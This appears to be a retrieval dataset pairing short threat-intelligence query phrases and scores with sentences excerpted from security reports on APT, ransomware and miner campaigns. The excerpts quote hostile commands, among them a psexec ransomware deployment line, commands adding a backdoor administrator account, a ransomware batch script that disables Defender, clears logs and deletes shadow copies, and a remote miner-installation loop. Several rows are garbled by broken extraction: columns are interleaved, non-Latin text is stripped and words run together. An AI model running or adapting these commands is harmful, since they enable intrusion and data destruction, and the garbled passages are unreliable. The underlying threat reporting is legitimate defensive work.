valid accounts|0.7636739801727512|"['Run a reconnaissance script to explore the victims system, checking for missing Windows patches and running security software.', 'b.', 'Execute WMI commands in search of relevant information such as password manager databases and Office documents.', 'c. Deploy a keylogger to retrieve the password for the victims password manager.', 'd. Run or deploy other tooling as necessary to complete the goal.', '5.', 'Exfiltrate such relevant information from the system, by downloading a single file or by compressing multiple files into a RAR archive.', '6.', 'Securely delete the deployed tools and exfiltrated compressed archives to hinder a forensic investigation.', '2.', 'Custom tool developed by the actor to provide tunneling capabilities 6 | Fox-IT | Operation Wocao3 Attribution Understanding who is behind an attack is usually not a priority for organizations affected by a breach.']"
used to download files…|0.8616249430855669|['After it is installed and started, the JPIN service can perform the following tasks, among others: Obtain information about the computer, such as operating system version, user name, privileges, disk space, and so on.', 'List running services, processes, job IDs, and task IDs.', 'Enumerate drives and their types.', 'Enumerate registry keys.', 'Load a custom keylogger.', 'Download files.', 'Download and upgrade itself.', 'Acquire network information such as DNS, IP, proxies, and so on.', 'Exfiltrate information over HTTP GET and POST requests, with the data stored either within the HTTP body or within the URL parameters.', 'Lower security settings by tampering with registry keys.', 'Inject content into the lsass.exe process, in order to load the keylogger module into lsass and call its exported function.']
""".bat"" files"|0.8292382999850628|[]
""".bat"" files"|0.8292382999850628|['.', '.', '.', '.', '.', '5 The Bat!', '.', '.', '.', '.', '.']
""".bat"" files"|0.7585679595011368|['The Mandiant investigation revealed that the attacker was in the early stages of a deploying LockerGoga.', 'Using domain administrator credentials, the attacker ran batch files containing psexec commands to connect to remote systems and deploy LockerGoga.', 'The batch scripts (Fig.', '11) executed LockerGoga as the service mstdc, which was likely the attackers attempt to masquerade as the legitimate Windows service msdtc.', 'The batch files used by Figure 11. the attacker followed the naming convention xaa.bat, xab.bat, xac.bat and Strings from so on.', 'deployment BAT files.', 'start copy svchost.exe \\\\\\\\10.1.1.1\\\\c$\\\\windows\\\\temp\\\\start psexec.exe \\\\\\\\10.1.1.1 -u domain\\\\domainadmin -p password -d -h -r mstdc -s -accepteula -nobanner c:\\\\windows\\\\temp\\\\svchost.exe Mandiant analysts linked the tools and attacker infrastructure to other FIN6 activity, and eventually concluded that FIN6 had expanded to using ransomware to further monetize their access to compromised environments.', 'UNC1733 In 2019, UNC1733 targeted a retailer and tried to obtain payment card information from the point-of-sale (POS) environment.', 'The attacker gained access to the environment by exploiting the CVE-2019-0604 vulnerability in a public-facing SharePoint server.', 'The exploit allowed the attacker to access the system and launch a Cobalt Strike backdoor.', 'After performing reconnaissance and lateral movement, the attacker obtained domain administrator privileges by harvesting credentials from systems in the environment.']
""".bat"" files"|0.8499449041686836|['The following commands show the basic network and domain information of the environment that has the infected system.', 'The collected information can be used later in lateral movement attacks.', 'If the attack succeeds, the attacker can dominate the systems within the domain.cmd.exe /c ping 11.11.11.1cmd.exe /c ipconfig /allcmd.exe /c query usercmd.exe net group domain admins /domainnet user _smuser white1234!', '@#$cmd.exe net localgroup administrators /add smi140199Jin MinerAnalyzing the ASD log for the infected system shows that before the Lazarus group installed NukeSped, other attackers had already exploited the vulnerability to install Jin Miner.', 'Jin Miner is known as a malware strain distributed through the Log4Shell vulnerability, as shown in theprevious Sophos report.Installed in the path shown above through the powershell command, Jin Miner is a CoinMiner that ultimately mines the Monero coin.MD5131fc4375971af391b459de33f81c2531875f6a68f70bee316c8a6eda9ebf8de47791bf9e017e3001ddc68a7351ca2d67a19c59c4373cadb4556f7e30ddd91ac7ef97450e84211f9f35d45e1e6ae1481URLhttp[:]//185[.]29[.]8[.]18/htroy[.]exehttp[:]//185[.]29[.]8[.]18[:]8888/http[:]//84[.]38[.]133[.]145[:]443/http[:]//84[.]38[.]133[.]16[:]8443/http[:]//iosk[.]org/pms/add[.', ']bat']
"USING "".BAT"" FILES"|0.7598740764243059|['The following commands show the basic network and domain information of the environment that has the infected system.', 'The collected information can be used later in lateral movement attacks.', 'If the attack succeeds, the attacker can dominate the systems within the domain.cmd.exe /c ping 11.11.11.1cmd.exe /c ipconfig /allcmd.exe /c query usercmd.exe net group domain admins /domainnet user _smuser white1234!', '@#$cmd.exe net localgroup administrators /add smi140199Jin MinerAnalyzing the ASD log for the infected system shows that before the Lazarus group installed NukeSped, other attackers had already exploited the vulnerability to install Jin Miner.', 'Jin Miner is known as a malware strain distributed through the Log4Shell vulnerability, as shown in theprevious Sophos report.Installed in the path shown above through the powershell command, Jin Miner is a CoinMiner that ultimately mines the Monero coin.MD5131fc4375971af391b459de33f81c2531875f6a68f70bee316c8a6eda9ebf8de47791bf9e017e3001ddc68a7351ca2d67a19c59c4373cadb4556f7e30ddd91ac7ef97450e84211f9f35d45e1e6ae1481URLhttp[:]//185[.]29[.]8[.]18/htroy[.]exehttp[:]//185[.]29[.]8[.]18[:]8888/http[:]//84[.]38[.]133[.]145[:]443/http[:]//84[.]38[.]133[.]16[:]8443/http[:]//iosk[.]org/pms/add[.', ']bat']
requests using RC4 encryption|0.761134744611517|['Substring in HTML file for search purposes 9We also analyzed the payload encryption process.', 'It consists of four stages: 1.', 'Key preparation (RC4KeyPrepare), with each byte XORed against a constant string.', '2.', 'Base64 encoding.', '3.', 'RC4 encryption.', '4.', 'ZLIB compression.', 'In the downloader code, inside the entry for the RC4 key used for decryption, our ex- perts uncovered friendly wishes from the developers (see Figure 11).', 'Figure 11.']
decrypt,|1.0|"['The execution of StealthMutant through InstallUtil.exe InstallUtil.exe is a legitimate installer application under Microsofts .NET Framework, but it is also known as a living-off-the-land binary (LOLBin) that is used in the proxy execution of .NET Framework programs.', 'In a scheduled task, InstallUtil.exe is registered to run StealthMutant, as demonstrated in Figure 11.', 'Figure 11.', 'InstallUtil.exe being registered to run StealthMutant via a scheduled task 10 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and BackdoorTechnical Analysis of the Loaders Earth Bakus new campaign takes advantage of the various capabilities of two shellcode loaders, StealthMutant and StealthVector.', 'StealthMutant StealthMutant is an evasive shellcode loader written in C# that has been in use since at least July 2020.', 'It reads a file that is encrypted by AES-256-ECB, decrypts the file in memory, injects its malicious payload into a remote process, and then executes it.', 'We have observed that its payload has been either the Cobalt Strike beacon or the ScrambleCross backdoor.', 'Most of the StealthMutant samples we have come across are obfuscated by ConfuserEx, an open-source obfuscator for .NET Framework applications.', 'After deobfuscating these samples, we have observed raw namespaces and classes that describe their purpose (Figure 12).', 'Figure 12.', 'The namespaces and classes from the deobfuscated samples 11 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and BackdoorAll the strings in StealthMutant are encrypted with the encryption algorithm AES-256-ECB and are decrypted on the spot, as shown in Figure 13.']"
decrypt its configuration strings|0.7714859756144762|['A ransom message HowToBackFiles.txt is placed in each directory which contains encrypted files.In the beginning of May, this ransomwarewas foundin the Wild.Fig 5:Ransom messageAfter its execution, the malware puts a batch file b.bat in %TEMP% and runs it.', 'The batch script contains the following content:@echo offset __COMPAT_LAYER=RunAsInvokerreg add HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\Memory Management /v ClearPageFileAtShutDown /t REG_DWORD /d 1 /freg add HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Advanced /v Hidden /t REG_DWORD /d 1 /freg add HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Advanced /v SuperHidden /t REG_DWORD /d 1 /freg add HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Advanced /v ShowSuperHidden /t REG_DWORD /d 1 /freg add HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 1 /freg add HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /fnet stop mssqlservernet stop sqlwriternet stop VeeamEndpointBackupSvcnet stop mssqlfdlaunchernet stop cpqvcagentnet stop TeamViewernet stop klsbackup2013pronet stop foxitreaderservicenet stop mysqlnet stop mssqlservernet stop mysql501net stop veeamdeploysvcnet stop veeamtransportsvcnet stop wuauservnet stop sysmgmthpnet stop sysdownnet stop adobearmservicenet stop themesnet stop sqlbrowsernet stop sql backupmasternet stop sqlagent$sql2008expnet stop sqltelemetry$sqlexpressnet stop mssql$sqlexpressnet stop mikroclientwservicenet stop reportservernet stop sqlserveragentnet stop MSSQL$MIKROnet stop msdtcnet stop sqltelemetryvvtaskkill /F /IM Veam.EndPoint.Tray.exetaskkill /F /IM jusched.exetaskkill /F /IM jucheck.exetaskkill /F /IM IAStorDataMgrSvc.exetaskkill /F /IM IAStorIcon.exetaskkill /F /IM isa.exetaskkill /F /IM armsvc.exetaskkill /F /IM TeamViewer.exetaskkill /F /IM TeamViewer_Service.exetaskkill /F /IM tv_w32.exetaskkill /F /IM tv_x64.exepowercfg.exe -h offRD /S /Q C:\\\\Windows\\\\Temp\\\\RD /S /Q C:\\\\Windows\\\\Logs\\\\RD /S /Q C:\\\\Windows\\\\Installer\\\\powershell.exe -ExecutionPolicy BypassDisable-ComputerRestore C:\\\\Disable-ComputerRestore D:\\\\Disable-ComputerRestore E:\\\\Disable-ComputerRestore F:\\\\Disable-ComputerRestore H:\\\\Clear-EventLog Windows PowerShellClear-RecycleBin -Confirm:$falsevssadmin delete shadows /allThe scripts is responsible for:Enabling setting for showing hidden filesDisabling Windows DefenderEnablingClearPageFileAtShutDownto purge the pagefile.sysStopping servicesStopping monitoring software (Veeam, TeamViewer, etc.', ')Disabling hibernationRemoving logsBypassing the PowerShell Execution PolicyDisabling restoration for the following logical disks: C, D, E, F, H;Clearing EventLog and Recycle BinDeleting shadow copies for all volumesThen the malware schedules a task which will execute the malware every 14 minutes.', 'The full command line for schtasks.exe is shown in Figure 6.Fig 6:Ransomware task creationThe obscured name of the task is just a damaged string SysUtils.', 'The malware uses a simple algorithm and a hardcoded key Hello World!', 'to decrypt the strings.', 'The developers deliberately or not applied this algorithm to a plain string to create a task name.Fig 7: Decrypting schtasks.exe parameters and damaging the task name by the same decryption algorithmThe string decryption algorithm is shown in Figure 8.Fig 8:Decrypting strings that are used in the ransomware source codeThe ransomware enumerates logical drives, visits all the directories except Windows, and encrypts all the files using AES128.', 'The password is a string representation of the system volume serial number.', 'Every file is encrypted in a separate thread.The victim ID which is shown in the ransom message is generated from the password (i.e.', 'C disk serial number) according to the following algorithm:Fig 9:Victim ID generation algorithmBasically, this can be rewritten as the following equation:where encryption key, plain text, cipher text and text index.As it is impossible to create an inverse function for this equation, it is likely that the malware operators have to bruteforce the password (p) on the basis of the known victim ID (c) and hardcoded key (k).', 'The following code can be used to restore the password from the victim ID:Fig 10:Restoring the password by the victim IDThe encryption itself is not obvious unless it was copy-pasted from the unit tests of theDelphiEncryptionCompendium(DEC) library.']
kernel32.VirtualProtect,|0.7652430848325863|"['PC   ,       .', '[ 1-1]  \'CVE-2022-41128\'  3InternetExplorer0-dayexploitedbyNorthKoreanactorAPT37 4[]\'\' 5"""" Genians Security Center 3Threat Intelligence Report 2.', '(Attack Scenario) 2.1.', '/  (Initial Access / Infection Vectors)      .', 'HWPX, HWP, LNK(XLSX ), DOCX  ,  XLSX   .', '.', ',   .', '.', '2.2.', '(Spear Phishing Attachment)  7   .', ', HWPX    .']"
obtained credentials for pivoting with Mimikatz|0.9597200616169498|"[""What's more, the initial infection was of a foreign office of the client."", 'Then a subsequent breach of the head office back home.', ""We believe that the initial entry point to the foreign office's network was a vulnerable server on the network perimeter."", 'Exploitation in February 2018 enabled the attackers to gain initial access and then persistence, with the help of the ChinaChopper and TwoFace web shells.', 'The attackers used NBTScan for network reconnaissance and PsExec for lateral movement.', 'They obtained credentials for pivoting with Mimikatz.', 'In some cases, we were able to detect memory dumps of the lsass process that had been archived and uploaded.', 'Because use of Mimikatz was likely blocked by endpoint security software, the attackers were forced to run bruteforcing offline.', 'Another method was to scan hosts for so-called Eternal* SMB vulnerabilities with SMBTouch and then, where possible, run the EternalBlue exploit and infect the computer.', 'On the hosts of presumably greatest interest, the SysUpdate and HyperBro backdoors were installed for reliable persistence and access.', 'One unexpected result of the compromise was cryptocurrency mining at both the foreign office and headquarters.']"
encrypting the base encryption key with RSA (with a hard-coded 1024-byte public key) and encoding it in Base64.|0.9265087046262602|"['However, this could also be a false flag.', '3.', 'Automation in 2018 and 2020 Here is the script used to automatically install a cryptocurrency miner on a list of computers in 2018: @echo off for /f %%i in (c:\\\\programdata\\\\list.txt) do ( net use \\\\\\\\%%i\\\\c$ ""*"" /u:*\\\\administrator copy c:\\\\programdata\\\\vmnat.exe \\\\\\\\%%i\\\\c$\\\\windows\\\\system32\\\\vmnat.exe SCHTASKS /Create /S %%i /u *\\\\administrator /p ""*"" /tn * /tr ""cmd.exe /c start c:\\\\windows\\\\system32\\\\vmnat.exe"" /sc onstart /RU SYSTEM schtasks /run /S %%i /u *\\\\administrator /p ""*"" /tn * net use \\\\\\\\%%i\\\\c$ /del net use * /del /Y ) del vmnat.exe del list.txt del work.bat And this is the script used to automatically delete the ransomware from a list of computers in 2020: @echo off for /f %%i in (c:\\\\programdata\\\\list.txt) do ( net use \\\\\\\\%%i\\\\c$ ""*"" /u:*\\\\* if not errorlevel 1 ( del \\\\\\\\%%i\\\\c$\\\\programdata\\\\GameuxInstallHelper.dll del \\\\\\\\%%i\\\\c$\\\\programdata\\\\GDFInstall.exe del \\\\\\\\%%i\\\\c$\\\\programdata\\\\Sysurl.Hex net use \\\\\\\\%%i\\\\c$ /del )ELSE ( echo not access %%i >> c:\\\\programdata\\\\no_access.txt ) ) (We replaced sensitive information with \'*\') https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/incident-response-polar-ransomware-apt27/ 19/2311/30/2020 Investigation with a twist: an accidental APT attack and averted data destruction The scripts show certain similarities in structure and have the same loop of file lines at the same path.', 'On the other hand, the indentation, script tasks, and file naming are different.', 'Some of the commands are too general to tell, since they could have been found in online search results and reused.', '4.', 'Bodies of the SysUpdate and HyperBro backdoors We were not able in some cases to confirm the presence of a given backdoor based on the body of the Trojan itself.', 'We identified the HyperBro backdoor, which had been used in 2018, based on the distinctive file name combined with other confirmed tools.', 'We confirmed the SysUpdate backdoor, used in 2020, by looking at the C2 address and backdoor body in the process dump memory that had been uploaded to VirusTotal during investigation from an organization not linked to our client.', 'Taken together, these similarities certainly point to APT27 as a culprit, but are not entirely conclusive.', 'Therefore we leave it to the reader to choose whether to concur regarding involvement by APT27.']"
uploaded.|0.757257461892006|"['Some gaming companies have already (storefronts, official video game content repositories) telemetry data, we can confirm that these two threats disruption conducted in 2023.', 'Our data suggests been targeted by ransomware gangs: the most recent to the uncharted waters of torrent sites and shady were still quite active in H1 2024. that even though RedLine Stealer is no longer being high-profile ransomware attack occurred near the Discord servers offering cracked games and cheating beginning of H1 2024, when the company Insomniac tools.', 'These grey areas are exactly where criminals Games, developers best known for their two big- thrive the possibility of getting a game for free, budget Spider-Man games, fell victim to a large-scale or of flawlessly executing headshots through walls data leak after refusing to pay ransom to the notorious in multiplayer shooters, constitute perfect bait for Rhysida ransomware group.', 'Sensitive data, ranging unsuspecting gamers.', 'What awaits the victims once from developers personal information to Insomniac hooked, are often infostealers that go after their Games roadmap of future game releases, was passwords, credit card data, or cryptowallets.', 'uploaded to the internet.', 'Infostealers-as-a-Service Even so, it is not only large businesses that are at risk; personal information of people who play video games Frequently, these attacks are conducted using is also an enticing target for cybercrooks, as evidenced infostealers distributed as a service; both RedLine by threat actors hiding malware payloads in all sorts of Stealer and Lumma Stealer, described in previous game-related files.', 'ESET Threat Reports, have been found to be the RedLine Stealer daily detection trend in H1 2024ESET THREAT REPORT Executive summary Foreword Threat landscape trends Threat telemetry Research publications About this report About ESET H1 2024 | 17 updated, it is still in use, though its mostly relegated to one-off campaigns Compromised mods In June 2023, hackers managed to compromise several accounts on isolated to one or two countries in 2024, its three biggest data peaks Minecraft modding platforms and injected infostealing code into existing Gamers not inclined to pirate games or use cheats can still come across were registered on January 25 (50% of detections registered in Germany), projects.', 'More recently, in December 2023, a popular mod for the game Slay harmful files when downloading other video game-related assets.', 'As an April 24 (87% in Spain), and May 20 (91% in Japan).', 'However, these peaks the Spire was breached to push Epsilon Stealer (which ESET detects as the example, mods, or modifications for a video game made by the games were so significant that RedLine Stealer detections in H1 2024 have actually JS/PSW.Agent trojan, variants .CH and .CI) via the Steam update system.']"
Exfiltration Over C2 Channel|0.7507577274301187|['Discovery The shellcode downloader chain checks running processes for a security solution.', 'Data from Local Deadglyph has a module for reading Collection T1005 System files.', 'Application Layer Deadglyph and the shellcode T1071.001 Protocol: Web downloader communicate with the Protocols C&C server via the HTTP protocol.', 'Deadglyph and the shellcode Command T1090 Proxy downloader can use HTTP proxy for and Control C&C communication.', 'Encrypted Channel: Deadglyph uses AES to encrypt C&C T1573.001 Symmetric communications.', 'Cryptography Exfiltration Over C2 Deadglyph uses the C&C channel for Exfiltration T1041 Channel exfiltration.', '11/11']
Exfiltration Over C2 Channel|0.7834499168665914|"['Defense Evasion Malicious updates shipped as ""trident"" bundles will perform DLL T1574.002 Hijack Execution Flow: DLL Side-Loading side loading.', 'Some of the final payloads such as PoisonIvy and Gh0st RAT Collection T1056.001 Input Capture:Keylogging have keylogging capabilities.', 'The PoisonIvy final payload variant has capabilities to T1090.001 Proxy: Internal Proxy authenticate with proxies.', 'Command and All malicious update instances communicate over raw TCP or T1095 Non-Application Layer Protocol Control UDP.', 'Both PosionIvy and Gh0st RAT use encrypted TCP T1573 Encrypted Channel communication to avoid detection.', 'Exfiltration in all malicious updates instances is done over a Exfiltration T1041 Exfiltration Over C2 Channel Command and Control channel.', 'Ignacio Sanmillan 1 Feb 2021 - 11:30AM Newsletter Email...', ""Submit Similar Articles CYBERCRIME MALWARE MALWARE MALWARE Emotet botnet disrupted in global Vadokrist: A wolf in sheep's Operation Spalax: Targeted 7 ways malware can get into your operation clothing malware attacks in Colombia device Discussion Home Sitemap Research RSS Configurator About Us Our Experts How To News Widget Contact Us ESET CategoriesPrivacy policy Legal Information Copyright ESET, All Rights Reserved""]"
Exfiltration Over C2 Channel|0.7841485113210257|['Command and T1071.001 Application Layer Protocol: Web Protocols Control The attacker uses web protocols to download additional tools, exfiltrate data and operate the malware.', 'T1132.001 Data Encoding: Standard Encoding The data is encoded using compression with a password.', 'T1090.001 Proxy: Internal Proxy The attacker uses netcat and Stowaway-Node to create tunnels inside the victim network.', 'T1090.002 Proxy: External Proxy The attacker uses netcat and Stowaway-Node to create tunnels to the outside of the network.', 'Exfiltration T1020 Automated Exfiltration The attacker can automatically exfiltrate Office documents.', 'T1041 Exfiltration Over C2 Channel The attacker exfiltrates data over the C2 channel.', 'T1567.002 Exfiltration Over Web Service: Exfiltration to Cloud Storage The attacker exfiltrates data to Google Drive.', 'ATTACKS ON INDUSTRIAL CONTROL SYSTEMS 14 USING SHADOWPAD 2022 AO KASPERSKY LABKaspersky Industrial Control Systems Cyber Emergency Response Team (Kaspersky ICS CERT) is a global project of Kaspersky aimed at coordinating the efforts of automation system vendors, industrial facility owners and operators, and IT security researchers to protect industrial enterprises from cyberattacks.', 'Kaspersky ICS CERT devotes its efforts primarily to identifying potential and existing threats that target industrial automation systems and the industrial internet of things.', 'Kaspersky ICS CERT ics-cert@kaspersky.com ATTACKS ON INDUSTRIAL CONTROL SYSTEMS 15 USING SHADOWPAD 2022 AO KASPERSKY LAB']
Exfiltration Over C2 Channel|0.7632166957405194|['Discovery T1082 System Information SparrowDoor collects the username, Discovery computername, RDP session ID, and drive types in the system and sends this data to the C&C server.', 'T1083 File and Directory SparrowDoor can probe files in a specified Discovery directory obtaining their names, attributes, sizes and last modified times, and sends this data to the C&C server.', 'Collection T1005 Data from Local SparrowDoor has the ability to read file contents System and exfiltrate them to the C&C server.', 'Command T1071.001 Application Layer SparrowDoor communicates with the C&C server and Control Protocol: Web using the HTTPS protocol.', 'Protocols T1573.001 Encrypted Channel: SparrowDoor encrypts/decrypts communications Symmetric with its C&C server using different multi-byte XOR Cryptography keys.', 'Exfiltration T1041 Exfiltration Over C2 SparrowDoor exfiltrates data over its C&C Channel channel.', 'https://www.welivesecurity.com/2021/09/23/famoussparrow-suspicious-hotel-guest/ 12/12']
Exfiltration Over C2 Channel|0.7841485113210257|"['Command T1071.001 Application Layer Protocol: Web Protocols and Control The attacker uses web protocols to download additional tools, exfiltrate data and operate the malware.', 'T1132.001 Data Encoding: Standard Encoding The data is encoded using compression with a password.', 'T1090.001 Proxy: Internal Proxy The attacker uses netcat and Stowaway-Node to create tunnels inside the victim network.', 'T1090.002 Proxy: External Proxy The attacker uses netcat and Stowaway-Node to create tunnels to the outside of the network.', 'Exfiltration T1020 Automated Exfiltration The attacker can automatically exfiltrate Office documents.', 'T1041 Exfiltration Over C2 Channel The attacker exfiltrates data over the C2 channel.', 'T1567.002 Exfiltration Over Web Service: Exfiltration to Cloud Storage The attacker exfiltrates data to Google Drive.', 'https://ics-cert.kaspersky.com/publications/reports/2022/06/27/attacks-on-industrial-control-systems-using-shadowpad/ 13/146/28/22, 5:07 PM Attacks on industrial control systems using ShadowPad | Kaspersky ICS CERT Authors Artem Snegirev Security Researcher, Kaspersky ICS CERT Kirill Kruglov Senior Research Developer, Kaspersky ICS CERT https://ics-cert.kaspersky.com/publications/reports/2022/06/27/attacks-on-industrial-control-systems-using-shadowpad/ 14/14']"
scan hosts for so-called Eternal* SMB vulnerabilities with SMBTouch and then, where possible, run the EternalBlue exploit and infect the computer|0.9550194187005093|['Exploitation in February 2018 enabled the attackers to gain initial access and then persistence, with the help of the ChinaChopper and TwoFace web shells.', 'The attackers used NBTScan for network reconnaissance and PsExec for lateral movement.', 'They obtained credentials for pivoting with Mimikatz.', 'In some cases, we were able to detect memory dumps of the lsass process that had been archived and uploaded.', 'Because use of Mimikatz was likely blocked by endpoint security software, the attackers were forced to run bruteforcing offline.', 'Another method was to scan hosts for so-called Eternal* SMB vulnerabilities with SMBTouch and then, where possible, run the EternalBlue exploit and infect the computer.', 'On the hosts of presumably greatest interest, the SysUpdate and HyperBro backdoors were installed for reliable persistence and access.', 'One unexpected result of the compromise was cryptocurrency mining at both the foreign office and headquarters.', 'Such activity remained unnoticed for one and a half years.', 'During this time the attackers only maintained their access abilities by periodically obtaining new accounts or building tunnel chains.', 'Our belief is that by early 2020, the attackers had lost their access (for reasons unknown to us).']
scan hosts for so-called Eternal* SMB vulnerabilities with SMBTouch and then, where possible, run the EternalBlue exploit and infect the computer|0.7514983990913985|"[""Then a subsequent breach of the head office back home.We believe that the initial entry point to the foreign office's network was a vulnerable server on the network perimeter."", 'Exploitation in February 2018 enabled the attackers to gain initial access and then persistence, with the help of theChinaChopperandTwoFaceweb shells.The attackers usedNBTScanfor network reconnaissance andPsExecfor lateral movement.', 'They obtained credentials for pivoting withMimikatz.', 'In some cases, we were able to detect memory dumps of the lsass process that had been archived and uploaded.', 'Because use of Mimikatz was likely blocked by endpoint security software, the attackers were forced to run bruteforcing offline.', 'Another method was to scan hosts for so-called Eternal* SMB vulnerabilities withSMBTouchand then, where possible, run the EternalBlue exploit and infect the computer.', 'On the hosts of presumably greatest interest, theSysUpdateandHyperBrobackdoors were installed for reliable persistence and access.One unexpected result of the compromise was cryptocurrency mining at both the foreign office and headquarters.', 'Such activity remained unnoticed for one and a half years.', 'During this time the attackers only maintained their access abilities by periodically obtaining new accounts or building tunnel chains.', 'Our belief is that by early 2020, the attackers had lost their access (for reasons unknown to us).', ""We can see use of web shells on the foreign office's servers on February 9, 2020.""]"
obtained the credentials of a domain administration at headquarters|0.7825091691000574|"['Such activity remained unnoticed for one and a half years.', 'During this time the attackers only maintained their access abilities by periodically obtaining new accounts or building tunnel chains.', 'Our belief is that by early 2020, the attackers had lost their access (for reasons unknown to us).', ""We can see use of web shells on the foreign office's servers on February 9, 2020."", 'Subsequent actions were very similar to what had happened two years earlier.', 'By using the tools already described, the attackers obtained the credentials of a domain administration at headquarters.', 'This time, they deleted OS logs and stopped Shadow Copy services, complicating subsequent incident analysis.', 'https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/incident-response-polar-ransomware-apt27/ 2/2311/30/2020 Investigation with a twist: an accidental APT attack and averted data destruction For the finale, on April 29, 2020, the account of the compromised domain admin was used to push Polar ransomware to computers and run it, encrypting user files and demanding a ransom.', 'While our specialists were assisting the client in May 2020, the attackers made yet another attempt to regain control of infrastructure with the help of web shells that were still in place on the network of the headquarters and office, but this time to no success.', 'Here we have provided a timeline to better show the sequence of events.', ""https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/incident-response-polar-ransomware-apt27/ 3/2311/30/2020 Investigation with a twist: an accidental APT attack and averted data destruction https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/incident-response-polar-ransomware-apt27/ 4/2311/30/2020 Investigation with a twist: an accidental APT attack and averted data destruction https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/incident-response-polar-ransomware-apt27/ 5/2311/30/2020 Investigation with a twist: an accidental APT attack and averted data destruction https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/incident-response-polar-ransomware-apt27/ 6/2311/30/2020 Investigation with a twist: an accidental APT attack and averted data destruction https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/incident-response-polar-ransomware-apt27/ 7/2311/30/2020 Investigation with a twist: an accidental APT attack and averted data destruction CSIRT's objectives included recovering the client's data, which included key information belonging to different departments.""]"
obtained the credentials of a domain administration at headquarters|0.7825091691000574|"['Such activity remained unnoticed for one and a half years.', 'During this time the attackers only maintained their access abilities by periodically obtaining new accounts or building tunnel chains.', 'Our belief is that by early 2020, the attackers had lost their access (for reasons unknown to us).', ""We can see use of web shells on the foreign office's servers on February 9, 2020."", 'Subsequent actions were very similar to what had happened two years earlier.', 'By using the tools already described, the attackers obtained the credentials of a domain administration at headquarters.', 'This time, they deleted OS logs and stopped Shadow Copy services, complicating subsequent incident analysis.For the finale, on April 29, 2020, the account of the compromised domain admin was used to push Polar ransomware to computers and run it, encrypting user files and demanding a ransom.', ""While our specialists were assisting the client in May 2020, the attackers made yet another attempt to regain control of infrastructure with the help of web shells that were still in place on the network of the headquarters and office, but this time to no success.Here we have provided a timeline to better show the sequence of events.CSIRT's objectives included recovering the client's data, which included key information belonging to different departments."", 'We performed analysis of the encryption malware and were able to recover the lost files.Polar ransomwareThe method used to run the ransomware is classic and, indeed, characteristic of certain Asian groups.', ""Three files are sent to the victim's computer:GDFInstall.exe (MD5: 13435101240f78367123ef01a938c560) is a legitimate computer game component signed by Ubisoft.GameuxInstallHelper.dll (MD5: 1fd8402275d42e7389f0d28b9537db0f) is a .NET DLL library (compiled on April 29, 2020) imported when GDFInstall.exe is run.This component is not actually legitimate, however: attacker code is executed after the GameExplorerInstallW symbol is exported."", 'This frequently used technique of loading malicious code in the context of a legitimate application is known asDLL hijacking.The file c:\\\\programdata\\\\Sysurl.Hex is read (after being copied from c:\\\\windows\\\\system32\\\\Sysurl.Hex, if absent) and then simple XOR decrypted with key ABCSCDFRWFFSDJJHGYUOIj.']"
Valid Accounts: Domain Accounts|0.8003464768737285|['Do they see that the top 60 most targeted victims in our dataset evolveintimeandifso,howquicklydotheyadapt receivedmaliciousemailsoftenoverthelastfouryears.', 'tonewdefensemechanisms?', '(We note that the dataset shared by one of our volun- teersstartsonAugust2012,explainingwhyweobserve (cid:15) What is the efficacy of existing countermeasures?', 'moremaliciousemailsafterthatdate.)', 'Wealsoseethat, As all malicious documents in our dataset used 31emailaccountsfromindividualswithoutaffiliationto well-known vulnerabilities, would commercial, WUC were often targeted simultaneously to the WUC state-of-the-artdefenseshavedetectedallofthem?', 'accounts.', '7Targeted vulnerabilities 60 50 40 30 20 10 0 200909 201009 201109 201209 201309 Time stnemucod suoicilam fo rebmuN Targeted applications 60 Unknown Others 50 20062492 20093129 20103333 40 20120158 30 20 10 0 200909 201009 201109 201209 201309 Time stnemucod suoicilam fo rebmuN Office Acrobat Figure8: Numberofmaliciousdocumentscontainingagivenvulnerability(CVE)(left)andtargetapplication(right) for each month of our dataset.', 'We represent the top four CVEs in number of attacks over the whole trace individu- ally and others are represented in aggregate.', 'The vertical line in November 2010 corresponds to the deployment of sandboxing in Acrobat Reader.', 'Although Acrobat Reader was the most targeted application until 2010, recent attacksmainlytargettheOfficesuite.', '4.1 Methodology our taint-assisted manual analysis are described in Ap- pendixB.']
Valid Accounts: Domain Accounts|0.8003464768737285|['Figure1: E-mailcontainingFinSpy.', '4.1 Bahrain 3 DataOverviewandImplications We have analyzed two attack campaigns in the context of Ourstudyisbasedonextensiveanalysisofmaliciousfilesand Bahrain,wherethegovernmenthasbeenpursuingacrackdown suspect communications relevant to the activities of targeted againstanArab-Springinspireduprisingsince2/14/2011.', 'groupsinBahrain,Syria,andtheUAE,asdocumentedinTa- The first involved malicious e-mails containing FinSpy, a ble1.Anumberoftheattackshadsignificantreal-worldimpli- lawfulintercepttrojansoldexclusivelytogovernments.', 'The cations,perTable2.', 'Inmanycases,wekeepourdescriptions secondinvolvedspeciallycraftedIPspylinksande-mailsde- somewhatimprecisetoavoidpotentialleakageoftargetidenti- signedtorevealtheIPaddressesofoperatorsofpseudonymous ties.', 'accounts.', 'Some individuals who apparently clicked on these We began our work when contacted by individuals con- links were later arrested, including Ali (cf.', '1), whose click cernedthatagovernmentmighthavetargetedthemforcyber- appears to have been used against him in court.', 'While both attacks.Aswebecamemoreacquaintedwiththetargetedcom- campaigns point back to the government, we have not as yet 